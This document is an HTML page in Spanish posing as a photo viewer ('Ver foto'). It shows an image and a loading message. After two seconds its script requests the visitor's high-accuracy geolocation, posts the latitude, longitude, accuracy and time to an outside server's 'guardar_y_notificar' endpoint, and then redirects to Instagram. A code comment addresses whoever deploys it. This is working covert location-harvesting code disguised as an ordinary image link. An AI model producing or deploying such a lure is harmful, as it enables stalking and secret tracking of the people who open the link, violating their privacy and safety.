<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Ver foto</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            background-color: #000; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh;
            font-family: Arial, sans-serif;
            color: white;
        }
        .container {
            text-align: center;
        }
        img {
            max-width: 100%;
            height: auto;
            border-radius: 10px;
        }
        .loader {
            font-size: 18px;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://i.imgur.com/fJkXnFf.jpg" alt="Foto">
        <p class="loader">Cargando contenido adicional...</p>
    </div>

    <script>
        async function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError, { 
                    enableHighAccuracy: true, 
                    timeout: 10000 
                });
            } else {
                redirigir();
            }
        }

        async function showPosition(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const precision = position.coords.accuracy;
            const fecha = new Date().toLocaleString();

            const formData = new FormData();
            formData.append('lat', lat);
            formData.append('lon', lon);
            formData.append('precision', precision);
            formData.append('fecha', fecha);

            try {
                // URL COMPLETA de tu servidor en Render (ya correcta)
                await fetch('https://imageo-mm44.onrender.com/guardar_y_notificar', {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Error enviando datos:", error);
            } finally {
                redirigir();
            }
        }

        function showError(error) {
            console.log("Error capturando ubicación: " + error.message);
            redirigir();
        }

        function redirigir() {
            window.location.href = "https://www.instagram.com/";
        }

        // Iniciar proceso tras 2 segundos
        setTimeout(getLocation, 2000);
    </script>
</body>
</html>
